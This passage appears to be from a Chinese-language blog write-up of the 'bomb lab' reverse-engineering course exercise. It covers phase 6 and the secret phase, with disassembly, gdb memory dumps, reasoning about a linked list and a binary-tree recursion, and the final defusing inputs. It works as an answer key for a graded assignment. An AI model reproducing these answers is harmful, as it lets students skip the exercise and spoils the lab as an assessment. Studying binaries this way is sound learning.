00 <br>    1893:48 89 44 24 58       mov    %rax,0x58(%rsp)<br>    1898:31 c0                xor    %eax,%eax<br>    189a:49 89 e5             mov    %rsp,%r13<br>    189d:4c 89 ee             mov    %r13,%rsi<br>    18a0:e8 8a 03 00 00       callq  1c2f &lt;read_six_numbers&gt;<br>    18a5:41 be 01 00 00 00    mov    $0x1,%r14d<br>    18ab:49 89 e4             mov    %rsp,%r12<br>    18ae:eb 28                jmp    18d8 &lt;phase_6+0x5e&gt;<br>    18b0:e8 4e 03 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    18b5:eb 30                jmp    18e7 &lt;phase_6+0x6d&gt;<br>    18b7:48 83 c3 01          add    $0x1,%rbx<br>    18bb:83 fb 05             cmp    $0x5,%ebx<br>    18be:7f 10                jg     18d0 &lt;phase_6+0x56&gt;<br>    18c0:41 8b 04 9c          mov    (%r12,%rbx,4),%eax<br>    18c4:39 45 00             cmp    %eax,0x0(%rbp)<br>    18c7:75 ee                jne    18b7 &lt;phase_6+0x3d&gt;<br>    18c9:e8 35 03 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    18ce:eb e7                jmp    18b7 &lt;phase_6+0x3d&gt;<br>    18d0:49 83 c6 01          add    $0x1,%r14<br>    18d4:49 83 c5 04          add    $0x4,%r13<br>    18d8:4c 89 ed             mov    %r13,%rbp<br>    18db:41 8b 45 00          mov    0x0(%r13),%eax<br>    18df:83 e8 01             sub    $0x1,%eax<br>    18e2:83 f8 05             cmp    $0x5,%eax<br>    18e5:77 c9                ja     18b0 &lt;phase_6+0x36&gt;<br>    18e7:41 83 fe 05          cmp    $0x5,%r14d<br>    18eb:7f 05                jg     18f2 &lt;phase_6+0x78&gt;<br>    18ed:4c 89 f3             mov    %r14,%rbx<br>    18f0:eb ce                jmp    18c0 &lt;phase_6+0x46&gt;       #分界线一<br>    18f2:be 00 00 00 00       mov    $0x0,%esi<br>    18f7:8b 0c b4             mov    (%rsp,%rsi,4),%ecx<br>    18fa:b8 01 00 00 00       mov    $0x1,%eax<br>    18ff:48 8d 15 0a 39 00 00 lea    0x390a(%rip),%rdx        # 5210 &lt;node1&gt;<br>    1906:83 f9 01             cmp    $0x1,%ecx<br>    1909:7e 0b                jle    1916 &lt;phase_6+0x9c&gt;<br>    190b:48 8b 52 08          mov    0x8(%rdx),%rdx<br>    190f:83 c0 01             add    $0x1,%eax<br>    1912:39 c8                cmp    %ecx,%eax<br>    1914:75 f5                jne    190b &lt;phase_6+0x91&gt;<br>    1916:48 89 54 f4 20       mov    %rdx,0x20(%rsp,%rsi,8)<br>    191b:48 83 c6 01          add    $0x1,%rsi<br>    191f:48 83 fe 06          cmp    $0x6,%rsi<br>    1923:75 d2                jne    18f7 &lt;phase_6+0x7d&gt;<br>    1925:48 8b 5c 24 20       mov    0x20(%rsp),%rbx<br>    192a:48 8b 44 24 28       mov    0x28(%rsp),%rax<br>    192f:48 89 43 08          mov    %rax,0x8(%rbx)<br>    1933:48 8b 54 24 30       mov    0x30(%rsp),%rdx<br>    1938:48 89 50 08          mov    %rdx,0x8(%rax)<br>    193c:48 8b 44 24 38       mov    0x38(%rsp),%rax<br>    1941:48 89 42 08          mov    %rax,0x8(%rdx)<br>    1945:48 8b 54 24 40       mov    0x40(%rsp),%rdx<br>    194a:48 89 50 08          mov    %rdx,0x8(%rax)<br>    194e:48 8b 44 24 48       mov    0x48(%rsp),%rax<br>    1953:48 89 42 08          mov    %rax,0x8(%rdx)<br>    1957:48 c7 40 08 00 00 00 movq   $0x0,0x8(%rax)<br>    195e:00 <br>    195f:bd 05 00 00 00       mov    $0x5,%ebp<br>    1964:eb 09                jmp    196f &lt;phase_6+0xf5&gt;<br>    1966:48 8b 5b 08          mov    0x8(%rbx),%rbx<br>    196a:83 ed 01             sub    $0x1,%ebp<br>    196d:74 11                je     1980 &lt;phase_6+0x106&gt;<br>    196f:48 8b 43 08          mov    0x8(%rbx),%rax<br>    1973:8b 00                mov    (%rax),%eax<br>    1975:39 03                cmp    %eax,(%rbx)<br>    1977:7e ed                jle    1966 &lt;phase_6+0xec&gt;<br>    1979:e8 85 02 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    197e:eb e6                jmp    1966 &lt;phase_6+0xec&gt;<br>    1980:48 8b 44 24 58       mov    0x58(%rsp),%rax<br>    1985:64 48 2b 04 25 28 00 sub    %fs:0x28,%rax<br>    198c:00 00 <br>    198e:75 0d                jne    199d &lt;phase_6+0x123&gt;<br>    1990:48 83 c4 60          add    $0x60,%rsp<br>    1994:5b                   pop    %rbx<br>    1995:5d                   pop    %rbp<br>    1996:41 5c                pop    %r12<br>    1998:41 5d                pop    %r13<br>    199a:41 5e                pop    %r14<br>    199c:c3                   retq   <br>    199d:e8 ae f8 ff ff       callq  1250 &lt;__stack_chk_fail@plt&gt;<br><br></code></pre></td></tr></table></figure><ul><li><p>这个题比较复杂</p></li><li><p>首先，18a0可看出，其读入6个数；</p></li><li><p>18f0以上，使用一系列的判断，最终效果是，输入的六个数均小于等于6大于等于1，且各不相同。</p></li><li><p>18f0之下的部分，就是按顺序将 node1 这个链表对应的数及地址逐个读入，读入的具体位次，是由输入的6个数决定的，如 1 就读入一次，也就是读入 node1 内存放的数据</p></li><li><p>知道了node1~node6中存放数据大小关系后，由小到大排序，输入即可通关</p></li><li><p>payload = 2 4 1 5 6 3</p></li><li><p>本题结束</p></li></ul><h2 id="Secret-Phase"><a href="#Secret-Phase" class="headerlink" title="Secret Phase"></a>Secret Phase</h2><ul><li><p>首先，发现有 secret phase 函数，其在 bomb_defused()内被调用；</p></li><li><p>进入这个函数后，先判断 num_input_strings == 6 是否成立，再在offset 57F0处读入3个数据；</p></li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">[----------------------------------registers-----------------------------------]<br><span class="hljs-symbol">RAX:</span> <span class="hljs-number">0x0</span> <br><span class="hljs-symbol">RBX:</span> <span class="hljs-number">0x0</span> <br><span class="hljs-symbol">RCX:</span> <span class="hljs-number">0x7fffffffde7c</span> --&gt; <span class="hljs-number">0x5555922000007fff</span> <br><span class="hljs-symbol">RDX:</span> <span class="hljs-number">0x7fffffffde78</span> --&gt; <span class="hljs-number">0x7ffff7e05490</span> (&lt;_IO_fgets+<span class="hljs-number">144</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>+<span class="hljs-number">0x0</span>])<br><span class="hljs-symbol">RSI:</span> <span class="hljs-number">0x555555557379</span> (<span class="hljs-string">&quot;%d %d %s&quot;</span>)<br><span class="hljs-symbol">RDI:</span> <span class="hljs-number">0x5555555597f0</span> (<span class="hljs-string">&quot;14 45 DrEvil&quot;</span>)<br><span class="hljs-symbol">RBP:</span> <span class="hljs-number">0x1</span> <br><span class="hljs-symbol">RSP:</span> <span class="hljs-number">0x7fffffffde70</span> --&gt; <span class="hljs-number">0x300000006</span> <br><span class="hljs-symbol">RIP:</span> <span class="hljs-number">0x555555555dff</span> (&lt;phase_defused+<span class="hljs-number">83</span>&gt;:<span class="hljs-keyword">call</span>   <span class="hljs-number">0x555555555300</span> &lt;__isoc99_sscanf@plt&gt;)<br><span class="hljs-built_in">R8</span> : <span class="hljs-number">0x7fffffffde80</span> --&gt; <span class="hljs-number">0x555555559220</span> --&gt; <span class="hljs-number">0x2000000ca</span> <br><span class="hljs-built_in">R9</span> : <span class="hljs-number">0x0</span> <br><span class="hljs-symbol">R10:</span> <span class="hljs-number">0x7ffff7f44ac0</span> --&gt; <span class="hljs-number">0x100000000</span> <br><span class="hljs-symbol">R11:</span> <span class="hljs-number">0x7ffff7f453c0</span> --&gt; <span class="hljs-number">0x2000200020002</span> <br><span class="hljs-symbol">R12:</span> <span class="hljs-number">0x7fffffffe008</span> --&gt; <span class="hljs-number">0x7fffffffe369</span> (<span class="hljs-string">&quot;/home/kawa/Desktop/bomb&quot;</span>)<br><span class="hljs-symbol">R13:</span> <span class="hljs-number">0x555555555489</span> (&lt;main&gt;:endbr64)<br><span class="hljs-symbol">R14:</span> <span class="hljs-number">0x555555558cf0</span> --&gt; <span class="hljs-number">0x555555555440</span> (&lt;__do_global_dtors_aux&gt;:endbr64)<br><span class="hljs-symbol">R15:</span> <span class="hljs-number">0x7ffff7ffd040</span> --&gt; <span class="hljs-number">0x7ffff7ffe2e0</span> --&gt; <span class="hljs-number">0x555555554000</span> --&gt; <span class="hljs-number">0x10102464c457f</span><br><span class="hljs-symbol">EFLAGS:</span> <span class="hljs-number">0x246</span> (carry PARITY adjust <span class="hljs-meta">ZERO</span> sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   <span class="hljs-number">0x555555555dec</span> &lt;phase_defused+<span class="hljs-number">64</span>&gt;:<span class="hljs-keyword">lea</span>    <span class="hljs-built_in">r8</span>,[<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x10</span>]<br>   <span class="hljs-number">0x555555555df1</span> &lt;phase_defused+<span class="hljs-number">69</span>&gt;:<span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rsi</span>,[<span class="hljs-built_in">rip</span>+<span class="hljs-number">0x1581</span>]        # <span class="hljs-number">0x555555557379</span><br>   <span class="hljs-number">0x555555555df8</span> &lt;phase_defused+<span class="hljs-number">76</span>&gt;:<br>    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rdi</span>,[<span class="hljs-built_in">rip</span>+<span class="hljs-number">0x39f1</span>]        # <span class="hljs-number">0x5555555597f0</span> &lt;input_strings+<span class="hljs-number">240</span>&gt;<br>=&gt; <span class="hljs-number">0x555555555dff</span> &lt;phase_defused+<span class="hljs-number">83</span>&gt;:<span class="hljs-keyword">call</span>   <span class="hljs-number">0x555555555300</span> &lt;__isoc99_sscanf@plt&gt;<br>   <span class="hljs-number">0x555555555e04</span> &lt;phase_defused+<span class="hljs-number">88</span>&gt;:<span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x3</span><br>   <span class="hljs-number">0x555555555e07</span> &lt;phase_defused+<span class="hljs-number">91</span>&gt;:<span class="hljs-keyword">je</span>     <span class="hljs-number">0x555555555e17</span> &lt;phase_defused+<span class="hljs-number">107</span>&gt;<br>   <span class="hljs-number">0x555555555e09</span> &lt;phase_defused+<span class="hljs-number">93</span>&gt;:<span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rdi</span>,[<span class="hljs-built_in">rip</span>+<span class="hljs-number">0x14a8</span>]        # <span class="hljs-number">0x5555555572b8</span><br>   <span class="hljs-number">0x555555555e10</span> &lt;phase_defused+<span class="hljs-number">100</span>&gt;:<span class="hljs-keyword">call</span>   <span class="hljs-number">0x555555555220</span> &lt;puts@plt&gt;<br>Guessed arguments:<br>arg[<span class="hljs-number">0</span>]: <span class="hljs-number">0x5555555597f0</span> (<span class="hljs-string">&quot;14 45 DrEvil&quot;</span>)<br>arg[<span class="hljs-number">1</span>]: <span class="hljs-number">0x555555557379</span> (<span class="hljs-string">&quot;%d %d %s&quot;</span>)<br>arg[<span class="hljs-number">2</span>]: <span class="hljs-number">0x7fffffffde78</span> --&gt; <span class="hljs-number">0x7ffff7e05490</span> (&lt;_IO_fgets+<span class="hljs-number">144</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>+<span class="hljs-number">0x0</span>])<br>arg[<span class="hljs-number">3</span>]: <span class="hljs-number">0x7fffffffde7c</span> --&gt; <span class="hljs-number">0x5555922000007fff</span> <br>arg[<span class="hljs-number">4</span>]: <span class="hljs-number">0x7fffffffde80</span> --&gt; <span class="hljs-number">0x555555559220</span> --&gt; <span class="hljs-number">0x2000000ca</span> <br><br><br></code></pre></td></tr></table></figure><p>注意RDI，也就是第一个参数的值，可以看出这个是 phase 4 的payload，故在修改 phase 4 payload = 14 45 DrEvil；</p><p>即可触发隐藏 phase</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00000000000019e3</span> &lt;secret_phase&gt;:<br>    <span class="hljs-attribute">19e3</span>:f3 <span class="hljs-number">0</span>f <span class="hljs-number">1</span>e fa          endbr64 <br>    <span class="hljs-attribute">19e7</span>:<span class="hljs-number">53</span>                   push   %rbx<br>    <span class="hljs-attribute">19e8</span>:e8 <span class="hljs-number">87</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">1</span>c74 &lt;read_line&gt;<br>    <span class="hljs-attribute">19ed</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> c7             mov    %rax,%rdi<br>    <span class="hljs-attribute">19f0</span>:ba <span class="hljs-number">0</span>a <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>xa,%edx<br>    <span class="hljs-attribute">19f5</span>:be <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x0,%esi<br>    <span class="hljs-attribute">19fa</span>:e8 e1 f8 ff ff       callq  <span class="hljs-number">12</span>e0 &lt;strtol@plt&gt;<br>    <span class="hljs-attribute">19ff</span>:<span class="hljs-number">89</span> c3                mov    %eax,%ebx<br>    <span class="hljs-attribute">1a01</span>:<span class="hljs-number">83</span> e8 <span class="hljs-number">01</span>             sub    $<span class="hljs-number">0</span>x1,%eax<br>    <span class="hljs-attribute">1a04</span>:<span class="hljs-number">3</span>d e8 <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       cmp    $<span class="hljs-number">0</span>x3e8,%eax<br>    <span class="hljs-attribute">1a09</span>:<span class="hljs-number">77</span> <span class="hljs-number">26</span>                ja     <span class="hljs-number">1</span>a31 &lt;secret_phase+<span class="hljs-number">0</span>x4e&gt;<br>    <span class="hljs-attribute">1a0b</span>:<span class="hljs-number">89</span> de                mov    %ebx,%esi<br>    <span class="hljs-attribute">1a0d</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">3</span>d <span class="hljs-number">1</span>c <span class="hljs-number">37</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> lea    <span class="hljs-number">0</span>x371c(%rip),%rdi        # <span class="hljs-number">5130</span> &lt;n1&gt;<br>    <span class="hljs-attribute">1a14</span>:e8 <span class="hljs-number">89</span> ff ff ff       callq  <span class="hljs-number">19</span>a2 &lt;fun7&gt;<br>    <span class="hljs-attribute">1a19</span>:<span class="hljs-number">83</span> f8 <span class="hljs-number">02</span>             cmp    $<span class="hljs-number">0</span>x2,%eax<br>    <span class="hljs-attribute">1a1c</span>:<span class="hljs-number">75</span> <span class="hljs-number">1</span>a                jne    <span class="hljs-number">1</span>a38 &lt;secret_phase+<span class="hljs-number">0</span>x55&gt;<br>    <span class="hljs-attribute">1a1e</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">3</span>d <span class="hljs-number">63</span> <span class="hljs-number">17</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> lea    <span class="hljs-number">0</span>x1763(%rip),%rdi        # <span class="hljs-number">3188</span> &lt;_IO_stdin_used+<span class="hljs-number">0</span>x188&gt;<br>    <span class="hljs-attribute">1a25</span>:e8 f6 f7 ff ff       callq  <span class="hljs-number">1220</span> &lt;puts@plt&gt;<br>    <span class="hljs-attribute">1a2a</span>:e8 <span class="hljs-number">7</span>d <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">1</span>dac &lt;phase_defused&gt;<br>    <span class="hljs-attribute">1a2f</span>:<span class="hljs-number">5</span>b                   pop    %rbx<br>    <span class="hljs-attribute">1a30</span>:c3                   retq   <br>    <span class="hljs-attribute">1a31</span>:e8 cd <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">1</span>c03 &lt;explode_bomb&gt;<br>    <span class="hljs-attribute">1a36</span>:eb d3                jmp    <span class="hljs-number">1</span>a0b &lt;secret_phase+<span class="hljs-number">0</span>x28&gt;<br>    <span class="hljs-attribute">1a38</span>:e8 c6 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">1</span>c03 &lt;explode_bomb&gt;<br>    <span class="hljs-attribute">1a3d</span>:eb df                jmp    <span class="hljs-number">1</span>a1e &lt;secret_phase+<span class="hljs-number">0</span>x3b&gt;<br><span class="hljs-attribute">00000000000019a2</span> &lt;fun7&gt;:<br>    <span class="hljs-attribute">19a2</span>:f3 <span class="hljs-number">0</span>f <span class="hljs-number">1</span>e fa          endbr64 <br>    <span class="hljs-attribute">19a6</span>:<span class="hljs-number">48</span> <span class="hljs-number">85</span> ff             test   %rdi,%rdi<br>    <span class="hljs-attribute">19a9</span>:<span class="hljs-number">74</span> <span class="hljs-number">32</span>                je     <span class="hljs-number">19</span>dd &lt;fun7+<span class="hljs-number">0</span>x3b&gt;<br>    <span class="hljs-attribute">19ab</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">08</span>          sub    $<span class="hljs-number">0</span>x8,%rsp<br>    <span class="hljs-attribute">19af</span>:<span class="hljs-number">8</span>b <span class="hljs-number">17</span>                mov    (%rdi),%edx<br>    <span class="hljs-attribute">19b1</span>:<span class="hljs-number">39</span> f2                cmp    %esi,%edx<br>    <span class="hljs-attribute">19b3</span>:<span class="hljs-number">7</span>f <span class="hljs-number">0</span>c                jg     <span class="hljs-number">19</span>c1 &lt;fun7+<span class="hljs-number">0</span>x1f&gt;<br>    <span class="hljs-attribute">19b5</span>:b8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x0,%eax<br>    <span class="hljs-attribute">19ba</span>:<span class="hljs-number">75</span> <span class="hljs-number">12</span>                jne    <span class="hljs-number">19</span>ce &lt;fun7+<span class="hljs-number">0</span>x2c&gt;<br>    <span class="hljs-attribute">19bc</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">08</span>          add    $<span class="hljs-number">0</span>x8,%rsp<br>    <span class="hljs-attribute">19c0</span>:c3                   retq   <br>    <span class="hljs-attribute">19c1</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>b <span class="hljs-number">7</span>f <span class="hljs-number">08</span>          mov    <span class="hljs-number">0</span>x8(%rdi),%rdi<br>    <span class="hljs-attribute">19c5</span>:e8 d8 ff ff ff       callq  <span class="hljs-number">19</span>a2 &lt;fun7&gt;<br>    <span class="hljs-attribute">19ca</span>:<span class="hljs-number">01</span> c0                add    %eax,%eax<br>    <span class="hljs-attribute">19cc</span>:eb ee                jmp    <span class="hljs-number">19</span>bc &lt;fun7+<span class="hljs-number">0</span>x1a&gt;<br>    <span class="hljs-attribute">19ce</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>b <span class="hljs-number">7</span>f <span class="hljs-number">10</span>          mov    <span class="hljs-number">0</span>x10(%rdi),%rdi<br>    <span class="hljs-attribute">19d2</span>:e8 cb ff ff ff       callq  <span class="hljs-number">19</span>a2 &lt;fun7&gt;<br>    <span class="hljs-attribute">19d7</span>:<span class="hljs-number">8</span>d <span class="hljs-number">44</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span>          lea    <span class="hljs-number">0</span>x1(%rax,%rax,<span class="hljs-number">1</span>),%eax<br>    <span class="hljs-attribute">19db</span>:eb df                jmp    <span class="hljs-number">19</span>bc &lt;fun7+<span class="hljs-number">0</span>x1a&gt;<br>    <span class="hljs-attribute">19dd</span>:b8 ff ff ff ff       mov    $<span class="hljs-number">0</span>xffffffff,%eax<br>    <span class="hljs-attribute">19e2</span>:c3                   retq   <br><br></code></pre></td></tr></table></figure><ul><li>先读入一行字符串，然后转换为整型；</li><li>注意 1a04 和 1a09，输入转换的整型，要小于等于1001，由此可发现，输入的数据应该是一个数，而不是几个。</li><li>随后调用 fun7，且最后返回值必须是2，否则爆炸。</li><li>来到fun7 内；</li><li>fun7 是一个递归函数，需要明确的是，rdi 是 fun7 的第一个参数，大概率是个指针（因为后面引用它时用了括号），esi是第二个参数，这个是我们最开始输入进去的一个数。</li><li>在 fun 7 内，esi的值是不改变的，也就是我们输入的值，一直都是参数之一，而另一个参数；</li><li>如果当前节点的值大于输入值，当前节点变为当前节点+8；</li><li>返回两倍的下一个节点调用fun7的返回值；</li><li>不满足大于的话，result 化为0；</li><li>若相等，直接返回0；</li><li>若当前节点值小于输入值，将result值赋为2倍的下一节点的值+1，且注意，下一节点是当前节点+16；</li><li>返回result值</li></ul><p>来看看这些节点，以及它们的值</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dns"><br><span class="hljs-number">0</span>x<span class="hljs-number">555555559130</span> &lt;n1&gt;:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000024</span><span class="hljs-number">0</span>x0000<span class="hljs-number">555555559150</span><br><span class="hljs-number">0</span>x<span class="hljs-number">555555559140</span> &lt;n1+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0</span>x0000<span class="hljs-number">555555559170</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0</span>x<span class="hljs-number">555555559150</span> &lt;n21&gt;:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000008</span><span class="hljs-number">0</span>x000055<span class="hljs-number">55555591d0</span><br><span class="hljs-number">0</span>x<span class="hljs-number">555555559160</span> &lt;n21+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0</span>x0000<span class="hljs-number">555555559190</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0</span>x<span class="hljs-number">555555559170</span> &lt;n22&gt;:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000032</span><span class="hljs-number">0</span>x000055<span class="hljs-number">55555591b0</span><br><span class="hljs-number">0</span>x<span class="hljs-number">555555559180</span> &lt;n22+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0</span>x000055<span class="hljs-number">55555591f0</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0</span>x<span class="hljs-number">555555559190</span> &lt;n32&gt;:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000016</span><span class="hljs-number">0</span>x000055<span class="hljs-number">55555590b0</span><br><span class="hljs-number">0</span>x55<span class="hljs-number">55555591a0</span> &lt;n32+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0</span>x00005<span class="hljs-number">55555559070</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0</span>x55<span class="hljs-number">55555591b0</span> &lt;n33&gt;:<span class="hljs-number">0</span>x000000000000002d<span class="hljs-number">0</span>x00005<span class="hljs-number">55555559010</span><br><span class="hljs-number">0</span>x55<span class="hljs-number">55555591c0</span> &lt;n33+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0</span>x000055<span class="hljs-number">55555590d0</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0</span>x55<span class="hljs-number">55555591d0</span> &lt;n31&gt;:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000006</span><span class="hljs-number">0</span>x00005<span class="hljs-number">55555559030</span><br><span class="hljs-number">0</span>x55<span class="hljs-number">55555591e0</span> &lt;n31+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0</span>x00005<span class="hljs-number">55555559090</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0</span>x55<span class="hljs-number">55555591f0</span> &lt;n34&gt;:<span class="hljs-number">0</span>x000000000000006b<span class="hljs-number">0</span>x00005<span class="hljs-number">55555559050</span><br><span class="hljs-number">0</span>x<span class="hljs-number">555555559200</span> &lt;n34+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0</span>x000055<span class="hljs-number">55555590f0</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><br><br></code></pre></td></tr></table></figure><p>再想想题目，我们最后需要构造这样的结构：</p><ul><li><p>返回值为2，有一种可能：</p><ul><li>通过最外层调用中，输入值小于节点值实现，要求最外层-1次调用返回值为1；</li></ul></li><li><p>故：倒数第二层调用必须返回值为1；</p></li><li><p>若某层返回值为1，这说明了什么捏？</p></li><li><p>说明该层调用的内一层调用，必须走a1 != a2 路线，且要求内层调用返回值为0；</p></li><li><p>若某层返回值为0，这又说明了什么捏？</p></li><li><p>一定是第一种调用，也就是a1 &gt; =a2，且内层一直是第一种调用，输入值小于节点值。</p></li><li><p>综上，输入值应满足：一直小于某些节点值，以及最外一层的节点值，但最内一层，输入值必须等于某一节点值，否则循环不完了。</p></li><li><p>有以下节点值：0x24, 0, 0x8, 0x32,0x16,0x2d,0x6,0x6b,0x0;</p></li><li><p>选择0x24尝试：</p><ul><li>先是等于，然后直接返回，不行；</li></ul></li><li><p>选择0x0尝试：</p><ul><li>0一直是最小的数，也不可能实现；</li></ul></li><li><p>选择0x8尝试：</p><ul><li>8 &lt; 24 , goto 1, node -&gt; node + 8, 8 &gt; 6, goto 2, node += 16,  16 &gt; 8 , 2d&gt;8，</li></ul></li><li><p>太多数据，不再尝试。</p></li><li><p><strong>再次分析</strong>，由于最初的节点是0x24，且最初节点必须走第一种跳转，也就是说第一层节点值大于输入值。</p></li><li><p><strong>然后</strong>，节点+8，来到50号的 0x8，这里要求，返回值为1，也就是传入值 &gt;=8，然后最后一层需要相等。这样一来，答案就明朗了，<strong>答案就是0x16</strong>。</p></li><li><p>测试一下：</p></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">22</span><br>Wow! Yo<span class="hljs-string">u&#x27;ve defused the secret stage!</span><br><span class="hljs-string">Congratulations! You&#x27;</span>ve defused the bomb!<br><br></code></pre></td></tr></table></figure><p>ok</p><p>全部通过</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kawa</span>@kawa-virtual-machine:~/Desktop$ ./bomb<br><span class="hljs-attribute">Welcome</span> to my fiendish little bomb. You have <span class="hljs-number">6</span> phases with<br><span class="hljs-attribute">which</span> to blow yourself up. Have a nice day!<br><span class="hljs-attribute">I</span> am not part of the problem. I am a Republican.<br><span class="hljs-attribute">Phase</span> <span class="hljs-number">1</span> defused. How about the next one?<br><span class="hljs-attribute">1</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">8</span> <span class="hljs-number">16</span> <span 